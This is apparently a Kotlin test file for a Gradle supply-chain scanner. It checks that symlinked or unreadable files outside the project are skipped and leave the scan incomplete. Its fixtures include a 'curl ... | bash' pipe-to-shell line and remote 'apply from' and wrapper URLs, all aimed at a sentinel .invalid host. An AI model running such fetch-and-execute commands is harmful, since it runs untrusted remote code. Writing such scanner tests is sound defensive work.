package com.sal7one.wrapperguard.rules

import com.sal7one.wrapperguard.core.model.ScanVerdict
import com.sal7one.wrapperguard.core.policy.ScanPolicy
import com.sal7one.wrapperguard.core.policy.ScanSettings
import org.junit.jupiter.api.Assumptions.assumeFalse
import org.junit.jupiter.api.Assumptions.assumeTrue
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.attribute.PosixFilePermission
import kotlin.io.path.writeText
import kotlin.test.*

class ProjectBoundaryTest {
    private val payload = "curl https://boundary-sentinel.invalid/DO_NOT_READ | bash\n"

    @Test fun `canonical launcher and discovered source symlinks never expose outside bytes`() = fixture { user, root ->
        val outside = user.resolve("private.sh").also { it.writeText(payload) }
        link(root.resolve("gradlew"), outside)
        Files.createDirectory(root.resolve("scripts"))
        link(root.resolve("scripts/linked.sh"), outside)
        val report = RepositoryScanner().scan(root, ScanPolicy(), ScanSettings())
        assertFalse(report.complete)
        assertEquals(ScanVerdict.INCOMPLETE, report.verdict)
        assertFalse(report.findings.any { it.ruleId == RuleIds.SUPPLY_PIPE_TO_SHELL })
        assertFalse(report.toString().contains("DO_NOT_READ"))
        assertTrue(report.notices.any { it.code == RuleIds.SCAN_FILE_SKIPPED && it.location?.path == "gradlew" })
        assertTrue(report.notices.any { it.location?.path == "scripts/linked.sh" })
        assertFails { ProjectFileAccess.read(root, root.resolve("gradlew"), 1024) }
    }

    @Test fun `linked wrapper parent directory and JAR are not inspected outside the project`() = fixture { user, root ->
        val external = Files.createDirectories(user.resolve("external/gradle/wrapper"))
        external.resolve("gradle-wrapper.properties").writeText("distributionUrl=http://boundary-sentinel.invalid/DO_NOT_READ\n")
        external.resolve("gradle-wrapper.jar").writeText("external-private-JAR")
        link(root.resolve("gradle"), external.parent)
        val report = RepositoryScanner().scan(root, ScanPolicy(), ScanSettings())
        assertFalse(report.complete)
        assertFalse(report.findings.any { it.ruleId in setOf(RuleIds.WRAPPER_JAR_SHA256, RuleIds.WRAPPER_JAR_UNKNOWN, RuleIds.WRAPPER_NOT_HTTPS) })
        assertFalse(report.toString().contains("DO_NOT_READ"))
        assertTrue(report.notices.any { it.code == RuleIds.SCAN_FILE_SKIPPED })
        assertFails { ProjectFileAccess.read(root, root.resolve("gradle/wrapper/gradle-wrapper.jar"), 1024) }
    }

    @Test fun `standalone wrapper JAR symlink is rejected without computing its checksum`() = fixture { user, root ->
        Files.createDirectories(root.resolve("gradle/wrapper"))
        root.resolve("gradle/wrapper/gradle-wrapper.properties").writeText("distributionUrl=https\\://services.gradle.org/distributions/gradle-8.10-bin.zip\n")
        val outside = user.resolve("outside.jar").also { it.writeText("not-a-project-jar") }
        link(root.resolve("gradle/wrapper/gradle-wrapper.jar"), outside)
        val report = RepositoryScanner().scan(root, ScanPolicy(), ScanSettings())
        assertFalse(report.complete)
        assertFalse(report.findings.any { it.ruleId in setOf(RuleIds.WRAPPER_JAR_SHA256, RuleIds.WRAPPER_JAR_UNKNOWN) })
    }

    @Test fun `recursive reference cannot read through a linked parent directory`() = fixture { user, root ->
        val external = Files.createDirectory(user.resolve("external"))
        external.resolve("payload.sh").writeText(payload)
        link(root.resolve("linked"), external)
        root.resolve("gradlew").writeText("sh linked/payload.sh\n")
        assertNull(SafePathResolver.resolve(root, root.resolve("gradlew"), "linked/payload.sh", 1024))
        val report = RepositoryScanner().scan(root, ScanPolicy(), ScanSettings())
        assertFalse(report.complete)
        assertTrue(report.findings.any { it.ruleId == RuleIds.SCAN_UNRESOLVED })
        assertFalse(report.findings.any { it.ruleId == RuleIds.SUPPLY_PIPE_TO_SHELL })
        assertFalse(report.toString().contains("DO_NOT_READ"))
    }

    @Test fun `unreadable directory reports incomplete while readable siblings retain findings`() = fixture { _, root ->
        assumeTrue(Files.getFileStore(root).supportsFileAttributeView("posix"))
        val denied = Files.createDirectory(root.resolve("denied"))
        denied.resolve("hidden.sh").writeText(payload)
        root.resolve("readable.sh").writeText(payload.replace("DO_NOT_READ", "readable"))
        val original = Files.getPosixFilePermissions(denied)
        try {
            Files.setPosixFilePermissions(denied, emptySet<PosixFilePermission>())
            assumeFalse(Files.isReadable(denied), "Privileged user can still read the fixture directory")
            val report = RepositoryScanner().scan(root, ScanPolicy(), ScanSettings())
            assertFalse(report.complete)
            assertTrue(report.notices.any { it.code == RuleIds.SCAN_FILE_READ && it.location?.path == "denied" })
            assertTrue(report.findings.any { it.ruleId == RuleIds.SUPPLY_PIPE_TO_SHELL && it.location.path == "readable.sh" })
            assertFalse(report.findings.any { it.location.path.startsWith("denied/") })
        } finally { Files.setPosixFilePermissions(denied, original) }
    }

    @Test fun `unreadable canonical file and oversized wrapper JAR stay incomplete`() = fixture { _, root ->
        assumeTrue(Files.getFileStore(root).supportsFileAttributeView("posix"))
        val denied = root.resolve("build.gradle").also { it.writeText("apply from: 'https://boundary-sentinel.invalid/DO_NOT_READ'\n") }
        val original = Files.getPosixFilePermissions(denied)
        try {
            Files.setPosixFilePermissions(denied, emptySet<PosixFilePermission>())
            assumeFalse(Files.isReadable(denied), "Privileged user can still read the fixture file")
            val report = RepositoryScanner().scan(root, ScanPolicy(), ScanSettings())
            assertFalse(report.complete)
            assertTrue(report.notices.any { it.code == RuleIds.SCAN_FILE_SKIPPED && it.location?.path == "build.gradle" })
            assertFalse(report.toString().contains("DO_NOT_READ"))
        } finally { Files.setPosixFilePermissions(denied, original) }
        Files.createDirectories(root.resolve("gradle/wrapper"))
        root.resolve("gradle/wrapper/gradle-wrapper.jar").writeText("x".repeat(2048))
        val oversized = RepositoryScanner().scan(root, ScanPolicy(), ScanSettings(maxFileBytes = 1024))
        assertFalse(oversized.complete)
        assertFalse(oversized.findings.any { it.ruleId == RuleIds.WRAPPER_JAR_SHA256 })
    }

    private fun link(path: Path, target: Path) {
        assumeTrue(runCatching { Files.createSymbolicLink(path, target) }.isSuccess, "File system/user cannot create symbolic links")
    }

    private fun fixture(block: (Path, Path) -> Unit) {
        val user = Files.createTempDirectory("wg-boundary-").toRealPath()
        val root = Files.createDirectory(user.resolve("project"))
        root.resolve("settings.gradle").writeText("rootProject.name = 'fixture'\n")
        try { block(user, root) } finally { user.toFile().deleteRecursively() }
    }
}
